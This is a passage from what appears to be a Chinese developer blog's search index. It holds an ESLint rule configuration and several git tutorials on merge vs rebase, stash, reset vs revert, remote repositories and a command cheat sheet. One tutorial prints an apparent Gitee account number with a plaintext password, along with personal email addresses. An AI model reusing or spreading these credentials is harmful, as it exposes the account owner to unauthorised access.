&quot;padded-blocks&quot;: 0,        // 要求对象字面量属性名称用引号括起来        &quot;quote-props&quot;: 0,        // 强制使用一致的反勾号、双引号或单引号        &quot;quotes&quot;: [2, &quot;double&quot;, &quot;avoid-escape&quot;],        // 要求使用 JSDoc 注释        &quot;require-jsdoc&quot;: 1,        // 要求或禁止使用分号而不是 ASI（这个才是控制行尾部分号的，）        &quot;semi&quot;: [2, &quot;always&quot;],        // 强制分号之前和之后使用一致的空格        &quot;semi-spacing&quot;: 0,        // 要求同一个声明块中的变量按顺序排列        &quot;sort-vars&quot;: 0,        // 强制在块之前使用一致的空格        &quot;space-before-blocks&quot;: [2, &quot;always&quot;],        // 强制在 function的左括号之前使用一致的空格        &quot;space-before-function-paren&quot;: [0, &quot;always&quot;],        // 强制在圆括号内使用一致的空格        &quot;space-in-parens&quot;: [2, &quot;never&quot;],        // 要求操作符周围有空格        &quot;space-infix-ops&quot;: 2,        // 强制在一元操作符前后使用一致的空格        &quot;space-unary-ops&quot;: [2, &#123;            &quot;words&quot;: true,            &quot;nonwords&quot;: false        &#125;],        // 强制在注释中 // 或 /* 使用一致的空格        &quot;spaced-comment&quot;: [2, &quot;always&quot;, &#123;            &quot;markers&quot;: [&quot;global&quot;, &quot;globals&quot;, &quot;eslint&quot;, &quot;eslint-disable&quot;, &quot;*package&quot;, &quot;!&quot;]        &#125;],        // 要求或禁止 Unicode BOM        &quot;unicode-bom&quot;: 0,        // 要求正则表达式被括号括起来        &quot;wrap-regex&quot;: 0,        //////////////        // ES6.相关 //        //////////////        // 要求箭头函数体使用大括号        &quot;arrow-body-style&quot;: 2,        // 要求箭头函数的参数使用圆括号        &quot;arrow-parens&quot;: 2,        &quot;arrow-spacing&quot;: [2, &#123;            &quot;before&quot;: true,            &quot;after&quot;: true        &#125;],        // 强制在子类构造函数中用super()调用父类构造函数，TypeScrip的编译器也会提示        &quot;constructor-super&quot;: 0,        // 强制 generator 函数中 * 号周围使用一致的空格        &quot;generator-star-spacing&quot;: [2, &#123;            &quot;before&quot;: true,            &quot;after&quot;: true        &#125;],        // 禁止修改类声明的变量        &quot;no-class-assign&quot;: 2,        // 不允许箭头功能，在那里他们可以混淆的比较        &quot;no-confusing-arrow&quot;: 0,        // 禁止修改 const 声明的变量        &quot;no-const-assign&quot;: 2,        // 禁止类成员中出现重复的名称        &quot;no-dupe-class-members&quot;: 2,        // 不允许复制模块的进口        &quot;no-duplicate-imports&quot;: 0,        // 禁止 Symbol 的构造函数        &quot;no-new-symbol&quot;: 2,        // 允许指定模块加载时的进口        &quot;no-restricted-imports&quot;: 0,        // 禁止在构造函数中，在调用 super() 之前使用 this 或 super        &quot;no-this-before-super&quot;: 2,        // 禁止不必要的计算性能键对象的文字        &quot;no-useless-computed-key&quot;: 0,        // 要求使用 let 或 const 而不是 var        &quot;no-var&quot;: 0,        // 要求或禁止对象字面量中方法和属性使用简写语法        &quot;object-shorthand&quot;: 0,        // 要求使用箭头函数作为回调        &quot;prefer-arrow-callback&quot;: 0,        // 要求使用 const 声明那些声明后不再被修改的变量        &quot;prefer-const&quot;: 0,        // 要求在合适的地方使用 Reflect 方法        &quot;prefer-reflect&quot;: 0,        // 要求使用扩展运算符而非 .apply()        &quot;prefer-spread&quot;: 0,        // 要求使用模板字面量而非字符串连接        &quot;prefer-template&quot;: 0,        // Suggest using the rest parameters instead of arguments        &quot;prefer-rest-params&quot;: 0,        // 要求generator 函数内有 yield        &quot;require-yield&quot;: 0,        // enforce spacing between rest and spread operators and their expressions        &quot;rest-spread-spacing&quot;: 0,        // 强制模块内的 import 排序        &quot;sort-imports&quot;: 0,        // 要求或禁止模板字符串中的嵌入表达式周围空格的使用        &quot;template-curly-spacing&quot;: 1,        // 强制在 yield* 表达式中 * 周围使用空格        &quot;yield-star-spacing&quot;: 2    &#125;&#125;\n\n\n关闭段落校验\n\n/* eslint-disable */\n\n\n关闭当前行校验\n\nsome code // eslint-disable-line\n\n\n关闭下一行校验\n\n// eslint-disable-next-linesome code","categories":["前端"],"tags":["eslint"]},{"title":"git rebase 和 git merge","url":"/2018/11/26/%E5%B7%A5%E5%85%B7/git%20rebase%20%E5%92%8C%20git%20merge/","content":"一、是什么在使用 git 进行版本管理的项目中，当完成一个特性的开发并将其合并到 master 分支时，会有两种方式：\n\ngit merge\ngit rebase\n\ngit rebase 与 git merge都有相同的作用，都是将一个分支的提交合并到另一分支上，但是在原理上却不相同\n用法上两者也十分的简单：\ngit merge将当前分支合并到指定分支，命令用法如下：\ngit merge xxx\n\ngit rebase将当前分支移植到指定分支或指定commit之上，用法如下：\ngit rebase -i &lt;commit&gt;\n\n常见的参数有--continue，用于解决冲突之后，继续执行rebase\ngit rebase --continue\n\n二、分析git merge通过git merge将当前分支与xxx分支合并，产生的新的commit对象有两个父节点\n如果“指定分支”本身是当前分支的一个直接子节点，则会产生快照合并\n举个例子，bugfix分支是从master分支分叉出来的，如下所示：\n\n合并bugfix分支到master分支时，如果master分支的状态没有被更改过，即 bugfix分支的历史记录包含master分支所有的历史记录\n所以通过把master分支的位置移动到bugfix的最新分支上，就完成合并\n如果master分支的历史记录在创建bugfix分支后又有新的提交，如下情况：\n\n这时候使用git merge的时候，会生成一个新的提交，并且master分支的HEAD会移动到新的分支上，如下：\n\n从上面可以看到，会把两个分支的最新快照以及二者最近的共同祖先进行三方合并，合并的结果是生成一个新的快照\ngit rebase同样，master分支的历史记录在创建bugfix分支后又有新的提交，如下情况：\n\n通过git rebase，会变成如下情况：\n\n在移交过程中，如果发生冲突，需要修改各自的冲突，如下：\n\nrebase之后，master的HEAD位置不变。因此，要合并master分支和bugfix分支\n\n从上面可以看到，rebase会找到不同的分支的最近共同祖先，如上图的B\n然后对比当前分支相对于该祖先的历次提交，提取相应的修改并存为临时文件（老的提交X和Y也没有被销毁，只是简单地不能再被访问或者使用）\n然后将当前分支指向目标最新位置D, 然后将之前另存为临时文件的修改依序应用\n三、区别从上面可以看到，merge和rebasea都是合并历史记录，但是各自特性不同：\nmerge通过merge合并分支会新增一个merge commit，然后将两个分支的历史联系起来\n其实是一种非破坏性的操作，对现有分支不会以任何方式被更改，但是会导致历史记录相对复杂\nrebaserebase会将整个分支移动到另一个分支上，有效地整合了所有分支上的提交\n主要的好处是历史记录更加清晰，是在原有提交的基础上将差异内容反映进去，消除了 git merge所需的不必要的合并提交\n","categories":["工具"],"tags":["git"]},{"title":"git-stach","url":"/2022/01/12/%E5%B7%A5%E5%85%B7/git-stach/","content":"一、是什么stash，译为存放，在 git 中，可以理解为保存当前工作进度，会把暂存区和工作区的改动进行保存，这些修改会保存在一个栈上\n后续你可以在任何时候任何分支重新将某次的修改推出来，重新应用这些更改的代码\n默认情况下，git stash会缓存下列状态的文件：\n\n添加到暂存区的修改（staged changes）\nGit跟踪的但并未添加到暂存区的修改（unstaged changes）\n\n但以下状态的文件不会缓存：\n\n在工作目录中新的文件（untracked files）\n被忽略的文件（ignored files）\n\n如果想要上述的文件都被缓存，可以使用-u或者--include-untracked可以工作目录新的文件，使用-a或者--all命令可以当前目录下的所有修改\n二、如何使用关于git stash常见的命令如下：\n\ngit stash\ngit stash save\ngit stash list\ngit stash pop\ngit stash apply\ngit stash show\ngit stash drop\ngit stash clear\n\ngit stash保存当前工作进度，会把暂存区和工作区的改动保存起来\ngit stash savegit stash save可以用于存储修改.并且将git的工作状态切回到HEAD也就是上一次合法提交上\n如果给定具体的文件路径,git stash只会处理路径下的文件.其他的文件不会被存储，其存在一些参数：\n\n–keep-index 或者 -k 只会存储为加入 git 管理的文件\n–include-untracked 为追踪的文件也会被缓存,当前的工作空间会被恢复为完全清空的状态\n-a 或者 –all 命令可以当前目录下的所有修改，包括被 git 忽略的文件\n\ngit stash list显示保存进度的列表。也就意味着，git stash命令可以多次执行，当多次使用git stash命令后，栈里会充满未提交的代码，如下：\n\n其中，stash@&#123;0&#125;、stash@&#123;1&#125;就是当前stash的名称\ngit stash popgit stash pop 从栈中读取最近一次保存的内容，也就是栈顶的stash会恢复到工作区\n也可以通过 git stash pop + stash名字执行恢复哪个stash恢复到当前目录\n如果从stash中恢复的内容和当前目录中的内容发生了冲突，则需要手动修复冲突或者创建新的分支来解决冲突\ngit stash apply将堆栈中的内容应用到当前目录，不同于git stash pop，该命令不会将内容从堆栈中删除\n也就说该命令能够将堆栈的内容多次应用到工作目录中，适应于多个分支的情况\n同样，可以通过git stash apply + stash名字执行恢复哪个stash恢复到当前目录\ngit stash show查看堆栈中最新保存的stash和当前目录的差异\n通过使用git stash show -p查看详细的不同\n通过使用git stash show stash@&#123;1&#125;查看指定的stash和当前目录差异\n\ngit stash dropgit stash drop + stash名称表示从堆栈中移除某个指定的stash\ngit stash clear删除所有存储的进度\n三、应用场景当你在项目的一部分上已经工作一段时间后，所有东西都进入了混乱的状态， 而这时你想要切换到另一个分支或者拉下远端的代码去做一点别的事情\n但是你创建一次未完成的代码的commit提交，这时候就可以使用git stash\n例如以下场景：\n当你的开发进行到一半,但是代码还不想进行提交 ,然后需要同步去关联远端代码时.如果你本地的代码和远端代码没有冲突时,可以直接通过git pull解决\n但是如果可能发生冲突怎么办.直接git pull会拒绝覆盖当前的修改，这时候就可以依次使用下述的命令：\n\ngit stash\ngit pull\ngit stash pop\n\n或者当你开发到一半，现在要修改别的分支问题的时候，你也可以使用git stash缓存当前区域的代码\n\ngit stash：保存开发到一半的代码\ngit commit -m ‘修改问题’\ngit stash pop：将代码追加到最新的提交之后\n\n","categories":["工具"],"tags":["git"]},{"title":"git reset 和 git revert","url":"/2018/11/30/%E5%B7%A5%E5%85%B7/git%20reset%20%E5%92%8C%20git%20revert/","content":"一、是什么git resetreset用于回退版本，可以遗弃不再使用的提交\n执行遗弃时，需要根据影响的范围而指定不同的参数，可以指定是否复原索引或工作树内容\n\ngit revert在当前提交后面，新增一次提交，抵消掉上一次提交导致的所有变化，不会改变过去的历史，主要是用于安全地取消过去发布的提交\n\n二、如何用git reset当没有指定ID的时候，默认使用HEAD，如果指定ID，那么就是基于指向ID去变动暂存区或工作区的内容\n// 没有指定ID, 暂存区的内容会被当前ID版本号的内容覆盖，工作区不变git reset// 指定ID，暂存区的内容会被指定ID版本号的内容覆盖，工作区不变git reset &lt;ID&gt; \n\n日志ID可以通过查询，可以git log进行查询，如下：\ncommit a7700083ace1204ccdff9f71631fb34c9913f7c5 (HEAD -&gt; master)Author: linguanghui &lt;linguanghui@baidu.com&gt;Date:   Tue Aug 17 22:34:40 2021 +0800    second commitcommit e31118663ce66717edd8a179688a7f3dde5a9393Author: linguanghui &lt;linguanghui@baidu.com&gt;Date:   Tue Aug 17 22:20:01 2021 +0800    first commit\n\n常见命令如下：\n\n–mixed（默认）：默认的时候，只有暂存区变化\n–hard参数：如果使用 –hard 参数，那么工作区也会变化\n–soft：如果使用 –soft 参数，那么暂存区和工作区都不会变化\n\n\ngit revert跟git reset用法基本一致，git revert 撤销某次操作，此次操作之前和之后的 commit和history都会保留，并且把这次撤销，作为一次最新的提交，如下：\ngit revert &lt;commit_id&gt; \n\n如果撤销前一个版本，可以通过如下命令：\ngit revert HEAD\n\n撤销前前一次，如下：\ngit revert HEAD^\n\n三、区别撤销（revert）被设计为撤销公开的提交（比如已经push）的安全方式，git reset被设计为重设本地更改\n因为两个命令的目的不同，它们的实现也不一样：重设完全地移除了一堆更改，而撤销保留了原来的更改，用一个新的提交来实现撤销\n两者主要区别如下：\n\ngit revert是用一次新的commit来回滚之前的commit，git reset是直接删除指定的commit\ngit reset 是把HEAD向后移动了一下，而git revert是HEAD继续前进，只是新的commit的内容和要revert的内容正好相反，能够抵消要被revert的内容\n在回滚这一操作上看，效果差不多。但是在日后继续 merge 以前的老版本时有区别\n\n\ngit revert是用一次逆向的commit“中和”之前的提交，因此日后合并老的branch时，之前提交合并的代码仍然存在，导致不能够重新合并\n但是git reset是之间把某些commit在某个branch上删除，因而和老的branch再次merge时，这些被回滚的commit应该还会被引入\n\n\n如果回退分支的代码以后还需要的情况则使用git revert， 如果分支是提错了没用的并且不想让别人发现这些错误代码，则使用git reset\n\n","categories":["工具"],"tags":["git"]},{"title":"git总结","url":"/2018/11/18/%E5%B7%A5%E5%85%B7/git%E6%80%BB%E7%BB%93/","content":"一、Git简介Git是一个免费的、开源的分布式版本控制系统，可以快速高效地处理从小型到大型的各种项目\nGit易于学习，占地面积小，性能极快。它具有廉价的本地库，方便的缓存区域和多个工作流分支等特性。其特性由于\nSubversion、CVS、Perforce和ClearCase等版本版本控制工具。\n在公司里用Git来管理代码，因此只要需要写代码就会用到git来管理代码\n\n\n==========Git========================\nGit介绍  分布式版本控制工具 VS 集中式版本控制工具\nGit安装  基于官网发布的最新版本2.31.1安装讲解\nGit命令  基于开发案例  详细讲解了gt的常用命令\nGit分支  分支特性  分支创建  分支转换  分支合并  代码合并冲突解决\nIdea  集成Git\n==========GitHub========================\n创建远程库\n代码推送Push\n代码拉取Pull\n代码克隆Clone\nSSH免密登录\nIdea集成GitHub\n==========Gitee码云========================\n码云创建远程库\nIdea集成Gitee码云\n码云连接GitHub进行代码的复制和迁移\n==========GitLab========================\nGitLab服务器的搭建和部署\nIdea集成GitLab\n课程目标：五小时熟练掌握Git GitHub GitLab Gitee码云的使用\n\n1.1 项目的版本管理\n在项目开发过程中，项目没开发到一个节点就会对当前项目进行备份，这个备份就是项目的一个版本；当我们继续开发一个阶段后，再次进行备份，就生成新的版本——多个版本的集合就是项目的版本库\n\n在项目版本管理中，我们可以使用手动进行管理，但是存在一些问题：\n\n需要手动维护版本的更新日志，记录每个版本的变化\n需要手动查找历史版本，当历史版本比较多的时候，查找工作很繁琐\n当我们需要回退到某个版本时，只能够手动的通过IDE工具手动打开\n\n1.2 团队协同开发\n1.3 版本管理工具—Git\nGit是一个开源的分布式版本控制系统，用于敏捷高效的处理任何大小项目的版本管理。\n\n核心功能：\n\n项目的版本管理\n团队协同开发\n\n二、Git下载及安装2.1 下载Git\n\n\nhttps://git-scm.com/\n\n\n\n\n\n\n2.2 安装Git\n除了选择安装位置以外，其他都傻瓜式安装\n\n2.3 检查\nwin + r\n输入cmd\n输入 git --version\n\n三、Git架构\n四、Git基本使用4.1 创建版本库\n在工作空间的目录中，右键“Git Bash Here”打开git终端\n\n在Git终端中输入git init指令，创建版本库（就是一个.git目录）\n\n\n\n4.2 查看版本库状态git status\n\n4.3 将工作空间的修改添加到暂存区git add a.txt   ## 只将工作空间中的某个文件add到暂存区git add . ## 将工作空间中所有文件都add暂存区\n\n4.4 将暂存区内容提交到版本库（仓库）git commit -m &#x27;版本说明&#x27;\n\n4.5 查看版本库中的历史版本git log --oneline  ## 每个版本信息只显示一行get log  ## 显示每个版本的详细信息\n\n4.6 设置用户信息\n因为我们将暂存区的内容提交到版本时，会记录当前版本的提交的用户信息，因此在版本提交之前需要先绑定用户信息\n\ngit config --global user.name &#x27;ergou&#x27;git config --global user.email &#x27;haha@hehe.com&#x27;\n\n4.7 同步历史版本到工作空间git checkout 版本号\n\n五、远程仓库5.1 远程仓库\n远程仓库，远程版本库；实现版本库的远程存储，以实现团队的协同开发\n\n\n\n\n远程仓库\n\n\n\n\n\n\n5.2 如何获得远程仓库\n使用GitLab搭建私服\n远程仓库提供商\nGitHub  https://gitbub.com\nGitee（码云） https://gitee.com\nCoding\n\n\n\n5.3 创建远程仓库（码云）\n注册账号\n\n366274379  &#x2F; admin123\n\n\n\n创建远程仓库：https://gitee.com/qfytao/j2010.git\n\n远程仓库管理（添加开发人员）\n\n\n\n六、远程仓库操作6.1 push本地仓库到远程仓库6.1.1 准备工作\n创建本地工作空间\nD:\\fmwy\tsrc\t\tmain\t\t\tjava\t\t\tresources\t\ttest\t\t\tjava\tpom.xml\n\n初始化本地仓库\ngit init\n\n将工作空间搭建的项目结构add到暂存区\ngit add .\n\n将暂存区文件提交到版本库，生成第一个版本\ngit commit -m &#x27;创建项目&#x27;\n\n为当前项目创建一个远程仓库\nhttps://gitee.com/qfytao/fmwy.git\n\n\n6.1.2 本地仓库关联远程仓库\n建立D:\\fmwy中的本地仓库 和 远程仓库https://gitee.com/qfytao/fmwy.git的关联\n\ngit remote add origin https://gitee.com/qfytao/fmwy.git\n\n6.1.3 查看远程仓库状态git remote -v\n\n6.1.4 将本地仓库push到远程仓库\npush到远程仓库需要gitee的帐号和密码\n\ngit push origin master\n\n\n6.2 其他开发者pull远程仓库到本地\n其他开发者：www.1114325587@qq.com    *****\n\n6.2.1 先创建本地仓库\n在E盘创建ws目录(空目录)，进入ws目录，打开Git客户端\n\n创建本地版本库\ngit init\n\n6.2.2 拉取远程仓库到本地\n拉取远程仓库\ngit pull 远程仓库地址 mastergit pull https://gitee.com/qfytao/fmwy2.git master\n\n6.3 解决协同开发冲突问题场景:    Helloworld.java  [bbb]开发者1：涛哥                              开发者2：小乔-------------------------------------------------------------------------------------------git pull fmwy2 master                    git pull fmwy2 master\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t     在Hellworld.java中新增内容 “bbb”在Hellworld.java中新增内容 “aaa”\t\t\t\t\t\t\t\t\t     git add .\t\t\t\t\t\t\t\t\t     git commit -m &#x27;&#x27;\t\t\t\t\t\t\t\t\t     git push fmwy2 mastergit add .git commit -m &#x27;&#x27;git push fmwy2 master【会失败！！！----在我pull之后，push之前被其他开发人员push过】\n\n问题：我该如何操作？git pull fmwy2 master 【将小乔修改的内容拉取到我本地】对文件进行冲突合并git add .git commit -m &#x27;&#x27;git push fmwy2 maste\n\nHelloWorld.java\n&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;HEADaaa=================bbb&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; sikdfhjkasdfhjasdfhjk\n\n七、分支管理7.1 什么是分支\n分支就是版本库中记录版本位置（支线），分支之间项目会影响，使用分支可以对项目起到保护作用\n分支就是一条时间线，每次提交就在这条时间线上形成一个版本\n\n7.2 分支特性\n创建一个新的版本库，默认创建一个主分支—master分支\n每个分支可以进行单独管理（常规分支、保护分支、只读分支）\n分支是可以合并的\n\n7.3 分支操作7.3.1 创建分支git branch branch_name\n\n7.3.2 查看分支git branch\n\n7.3.3 切换分支git branch branch_name  # 切换到指定分支上的最新版本\n\n7.3.4 检出分支git checkout 历史版本 -b branch_name  # 签出指定的历史版本创建新分支\n\n7.3.5 分支合并\n三方合并\n快速合并\n\n# 在master分支执行 git merge dev   表示将dev分支合并mergegit merge breanch_name\n\n八、Idea整合Git使用\n作为Java开发工程，我们代码的编写工作都是在IDE工具（idea）中完成，因此我们需要了解和掌握直接使用IDE工具完成Git的操作\n\n8.1 IDEA关联Git\n8.2 IDEA中Git版本管理\n准备工作：打开IDEA新建一个web工程\n\n8.2.1 创建本地版本库\n\n\n\n\n\n\n\n\n\n\n\n\n8.2.2 设置忽略文件\n在工作空间中有些文件是不需要记录到版本库中的（例如.idea、target、.iml文件），可以通过设置忽略提交来实现\n\n\n在工作空间的根目录（项目的根目录）中创建一个名为.gitignore文件\n\n在.gitignore文件配置忽略过滤条件\n.ideatarget*.iml\n\n8.2.3 将工作空间add到暂存区\n选择项目&#x2F;文件—右键—Git—Add（添加到暂存区的文件–绿色）\n\n如果一个文件创建好之后还没有添加到暂存区–棕红色\n\n添加到暂存区的操作可以设置默认添加\n\n\n\n8.2.4 将暂存区提交到版本库\n选择项目&#x2F;文件—右键—Git–Commit（记录到版本库的文件–黑色）\n\n如果对记录到 版本库的文件进行了修改，也就是说工作空间和版本库不一致–蓝色\n\n\n8.3 IDEA中Git分支管理8.3.1 创建分支\n点击IDEA右下角Git\n在弹窗中点击New Branch\n输入新分支的名称\n\n8.3.2 切换分支\n点击IDEA右下角Git\n点击非当前分支右边的箭头\n在选项卡点击checkout\n\n8.3.3 删除分支\n\n\n点击右小角git\n\n\n\n\n\n\n8.3.4 合并分支\n例如：将dev合并到master\n\n\n切换到master分支\n点击dev分支右面的箭头，在展开的菜单中选择Merge into current\n\n8.4 IDEA中使用Git进行团队协同开发8.4.1 项目管理者\n完成项目搭建\n\n略\n\n\n为当前项目创建本地版本库\n\n将搭建好的项目提交到本地版本库\n\nadd到暂存区\ncommit到版本库\n\n\n创建远程版本库（远程仓库）\n\nhttps://gitee.com/qfytao/git-jd.git\n管理—添加开发者\n\n\n将本地仓库push到远程仓库（master分支——master分支）\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n在本地创建dev分支\n\n在远程仓库checkout as 新建本地dev分支（master需要进行保护）\n\n\n\n\n\n\n\n\n\n\n\n\n将本地dev分支push到远程仓库，新建远程仓库的dev分支\n\n\n设置远程仓库中master分支为保护分支\n\n\n\n8.4.2 项目开发者\n从管理员提供的远程仓库pull项目到本地\n\n远程仓库 https://gitee.com/qfytao/git-jd.git\n\n\n\n\n\n\n\n\n\n\n\n\n打开项目（此时本地工作空间的项目和远程仓库是同步的）\n\n开发步骤：\n\n选择要修改的文件–pull\n进行修改操作\n测试本地修改\nadd到暂存区\ncommit到本地版本库\npush到远程仓库（dev）\n\n\n\n8.5 解决团队协同开发的冲突问题\n冲突：在pull之后，push之前被其他开发者这push成功\n\n\n选择产生冲突的文件—pull\n弹出弹窗提示：accpet yours | accept theirs | Merge\naccpet yours  保留自己的版本（提交时会覆盖其他开发者代码）\naccpet theirs 保留远程仓库上的版本（会导致自己修改的代码丢失）\nMerge 手动合并（和其他开发者沟通合并方案）\n\n\n\n","categories":["工具"],"tags":["git"]},{"title":"git的理解","url":"/2018/12/09/%E5%B7%A5%E5%85%B7/git%E7%9A%84%E7%90%86%E8%A7%A3/","content":"一、是什么git，是一个分布式版本控制软件，最初目的是为更好地管理Linux内核开发而设计\n分布式版本控制系统的客户端并不只提取最新版本的文件快照，而是把代码仓库完整地镜像下来。这么一来，任何一处协同工作用的服务器发生故障，事后都可以用任何一个镜像出来的本地仓库恢复\n\n项目开始，只有一个原始版仓库，别的机器可以clone这个原始版本库，那么所有clone的机器，它们的版本库其实都是一样的，并没有主次之分\n所以在实现团队协作的时候，只要有一台电脑充当服务器的角色，其他每个人都从这个“服务器”仓库clone一份到自己的电脑上，并且各自把各自的提交推送到服务器仓库里，也从服务器仓库中拉取别人的提交\ngithub实际就可以充当这个服务器角色，其是一个开源协作社区，提供Git仓库托管服务，既可以让别人参与你的开源项目，也可以参与别人的开源项目\n二、工作原理当我们通过git init创建或者git clone一个项目的时候，项目目录会隐藏一个.git子目录，其作用是用来跟踪管理版本库的\nGit 中所有数据在存储前都计算校验和，然后以校验和来引用，所以在我们修改或者删除文件的时候，git能够知道\nGit用以计算校验和的机制叫做 SHA-1 散列（hash，哈希）， 这是一个由 40 个十六进制字符（0-9 和 a-f）组成字符串，基于 Git 中文件的内容或目录结构计算出来，如下：\n24b9da6552252987aa493b52f8696cd6d3b00373\n\n当我们修改文件的时候，git就会修改文件的状态，可以通过git status进行查询，状态情况如下：\n\n已修改（modified）：表示修改了文件，但还没保存到数据库中。\n已暂存（staged）：表示对一个已修改文件的当前版本做了标记，使之包含在下次提交的快照中。\n已提交（committed）：表示数据已经安全的保存在本地数据库中。\n\n文件状态对应的，不同状态的文件在Git中处于不同的工作区域，主要分成了四部分：\n\n工作区：相当于本地写代码的区域，如 git clone 一个项目到本地，相当于本地克隆了远程仓库项目的一个副本\n暂存区：暂存区是一个文件，保存了下次将提交的文件列表信息，一般在 Git 仓库目录中\n本地仓库：提交更新，找到暂存区域的文件，将快照永久性存储到 Git 本地仓库\n远程仓库：远程的仓库，如 github\n\n\n三、命令从上图可以看到，git日常简单的使用就只有上图6个命令：\n\nadd\ncommit\npush\npull\nclone\ncheckout\n\n但实际上还有很多命令，如果想要熟练使用，还有60个多命令，通过这些命令的配合使用，能够提高个人工作效率和团队协助能力\n","categories":["工具"],"tags":["git"]},{"title":"git指令集合","url":"/2018/12/14/%E5%B7%A5%E5%85%B7/git%E6%8C%87%E4%BB%A4%E9%9B%86%E5%90%88/","content":"安装\n在 Windows 上安装 Git 同样轻松，有个叫做 msysGit 的项目提供了安装包：\nhttp://msysgit.github.io/\n\n完成安装之后，就可以使用命令行的 git 工具（已经自带了 ssh 客户端）了，另外还有一个图形界面的 Git 项目管理工具。\n\n\n配置\n首先是配置帐号信息\n\ngit config -e [--global] # 编辑Git配置文件git config --global user.name yanhaijinggit config --global user.email yanhaijing@yeah.netgit config --list #查看配置的信息git help config #获取帮助信息\n\n\n配置自动换行（自动转换坑太大）\n\ngit config --global core.autocrlf input #提交到git是自动将换行符转换为lf\n\n\n配置密钥\n\nssh-keygen -t rsa -C yanhaijing@yeah.net #生成密钥ssh -T git@github.com #测试是否成功\n\n\n配置别名，git的命令没有自动完成功能，有点坑哈，别名派上了用场\n\ngit config --global alias.st status #git stgit config --global alias.co checkout #git cogit config --global alias.br branch #git brgit config --global alias.ci commit #git ci\n\n新建仓库git init #初始化git status #获取状态git add [file1] [file2] ... #.或*代表全部添加git commit -m &quot;message&quot; #此处注意乱码git remote add origin git@github.com:yanhaijing/test.git #添加源git push -u origin master #push同事设置默认跟踪分支git reflog 查看历史记录git reset --hard 版本号 版本穿梭\n\n从现有仓库克隆\ngit clone git://github.com/yanhaijing/data.js.git    git clone git://github.com/schacon/grit.git mypro#克隆到自定义文件夹\n\n本地\ngit add * # 跟踪新文件git add -u [path] # 添加[指定路径下]已跟踪文件rm *&amp;git rm * # 移除文件git rm -f * # 移除文件git rm --cached * # 停止追踪指定文件，但该文件会保留在工作区git mv file_from file_to # 重命名跟踪文件git log # 查看提交记录git commit # 提交更新    git commit [file1] [file2] ... # 提交指定文件    git commit -m &#x27;message&#x27;git commit -a # 跳过使用暂存区域，把所有已经跟踪过的文件暂存起来一并提交git commit --amend#修改最后一次提交git commit -v # 提交时显示所有diff信息git reset HEAD *#取消已经暂存的文件git reset --mixed HEAD *#同上git reset --soft HEAD *#重置到指定状态，不会修改索引区和工作树git reset --hard HEAD *#重置到指定状态，会修改索引区和工作树git reset -- files#重置index区文件git revert HEAD #撤销前一次操作git revert HEAD~ #撤销前前一次操作git revert commit ## 撤销指定操作git checkout -- file#取消对文件的修改（从暂存区——覆盖worktree file）git checkout branch|tag|commit -- file_name#从仓库取出file覆盖当前分支git checkout -- .#从暂存区取出文件覆盖工作区git diff file #查看指定文件的差异git diff --stat #查看简单的diff结果git diff #比较Worktree和Index之间的差异git diff --cached #比较Index和HEAD之间的差异git diff HEAD #比较Worktree和HEAD之间的差异git diff branch #比较Worktree和branch之间的差异git diff branch1 branch2 #比较两次分支之间的差异git diff commit commit #比较两次提交之间的差异git log #查看最近的提交日志git log --pretty=oneline #单行显示提交日志git log --graph # 图形化显示git log --abbrev-commit # 显示log id的缩写git log -num #显示第几条log（倒数）git log --stat # 显示commit历史，以及每次commit发生变更的文件git log --follow [file] # 显示某个文件的版本历史，包括文件改名git log -p [file] # 显示指定文件相关的每一次diffgit stash #将工作区现场（已跟踪文件）储藏起来，等以后恢复后继续工作。git stash list #查看保存的工作现场git stash apply #恢复工作现场git stash drop #删除stash内容git stash pop #恢复的同时直接删除stash内容git stash apply stash@&#123;0&#125; #恢复指定的工作现场，当你保存了不只一份工作现场时。\n\n分支git branch#列出本地分支git branch -r#列出远端分支git branch -a#列出所有分支git branch -v#查看各个分支最后一个提交对象的信息git branch --merge#查看已经合并到当前分支的分支git branch --no-merge#查看为合并到当前分支的分支git branch test#新建test分支git branch branch [branch|commit|tag] # 从指定位置出新建分支git branch --track branch remote-branch # 新建一个分支，与指定的远程分支建立追踪关系git branch -m old new #重命名分支git branch -d test#删除test分支git branch -D test#强制删除test分支git branch --set-upstream dev origin/dev #将本地dev分支与远程dev分支之间建立链接git checkout test#切换到test分支git checkout -b test#新建+切换到test分支git checkout -b test dev#基于dev新建test分支，并切换git merge test#将test分支合并到当前分支git merge --squash test ## 合并压缩，将test上的commit压缩为一条git cherry-pick commit #拣选合并，将commit合并到当前分支git cherry-pick -n commit #拣选多个提交，合并完后可以继续拣选下一个提交git rebase master#将master分之上超前的提交，变基到当前分支git rebase --onto master 169a6 #限制回滚范围，rebase当前分支从169a6以后的提交git rebase --interactive #交互模式    git rebase --continue# 处理完冲突继续合并    git rebase --skip# 跳过    git rebase --abort# 取消合并\n\n远端git fetch origin remotebranch[:localbranch]# 从远端拉去分支[到本地指定分支]git merge origin/branch#合并远端上指定分支git pull origin remotebranch:localbranch# 拉去远端分支到本地分支git push origin branch#将当前分支，推送到远端上指定分支git push origin localbranch:remotebranch#推送本地指定分支，到远端上指定分支git push origin :remotebranch # 删除远端指定分支git push origin remotebranch --delete # 删除远程分支git branch -dr branch # 删除本地和远程分支git checkout -b [--track] test origin/dev#基于远端dev分支，新建本地test分支[同时设置跟踪]\n\n源\ngit是一个分布式代码管理工具，所以可以支持多个仓库，在git里，服务器上的仓库在本地称之为remote。\n\n\n个人开发时，多源用的可能不多，但多源其实非常有用。\n\ngit remote add origin1 git@github.com:yanhaijing/data.js.gitgit remote#显示全部源git remote -v#显示全部源+详细信息git remote rename origin1 origin2#重命名git remote rm origin#删除git remote show origin#查看指定源的全部信息\n\n标签\n当开发到一定阶段时，给程序打标签是非常棒的功能。\n\ngit tag#列出现有标签    git tag v0.1 [branch|commit] # [从指定位置]新建标签git tag -a v0.1 -m &#x27;my version 1.4&#x27;#新建带注释标签git checkout tagname#切换到标签git push origin v1.5#推送分支到源上git push origin --tags#一次性推送所有分支git tag -d v0.1#删除标签git push origin 